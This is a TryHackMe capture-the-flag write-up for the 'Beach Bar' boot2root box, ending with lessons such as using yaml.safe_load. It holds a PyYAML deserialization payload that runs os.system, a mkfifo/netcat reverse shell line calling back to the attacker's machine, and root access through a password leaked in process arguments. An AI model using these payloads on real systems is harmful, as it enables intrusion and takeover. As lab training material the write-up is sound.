# THM - Hacker Holidays Day 5: Beach Bar
**Category:** Boot2Root
**Difficulty:** Easy

## Tools Used
- nmap
- Browser
- netcat
- Python 3

## Steps
1. Connected to TryHackMe VPN: `sudo openvpn thm.ovpn`
2. Ran `nmap -sV <IP>` — found port 22 (SSH) and 80 (HTTP/Gunicorn)
3. Opened website in browser — found DJ booth login page
4. Viewed page source — found HTML comment revealing demo credentials:
   `dj / dj`
5. Logged in as DJ — found Import feature accepting YAML playlists
6. Tested YAML injection to confirm code execution:
   `!!python/object/apply:os.system ["id"]` — returned 0 (success)
7. Set up netcat listener on Kali: `nc -lvnp 4444`
8. Submitted reverse shell YAML payload:
   `!!python/object/apply:os.system ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <tun0_IP> 4444 >/tmp/f"]`
9. Got shell as `bartender`
10. Read user flag: `find / -name "user.txt" 2>/dev/null && cat /home/bartender/user.txt`
11. Upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
12. Checked running processes for credentials: `ps aux | grep jukeboxd`
13. Found password in process arguments: `--stream-pass <stream_password>`
14. Switched to root: `su root` with password `<stream_password>`
15. Read root flag: `cat /root/root.txt`

## What I Learned
- Always check HTML source and comments — developers leave sensitive notes behind
- PyYAML's `yaml.load()` allows arbitrary Python code execution — always use `yaml.safe_load()`
- Reverse shells work by making the target connect back to your machine
- `ps aux` reveals command-line arguments including passwords passed to running services
- Credentials are often reused across services — the stream password also worked for root
- Upgrading a shell with `pty.spawn` enables full interactive terminal features
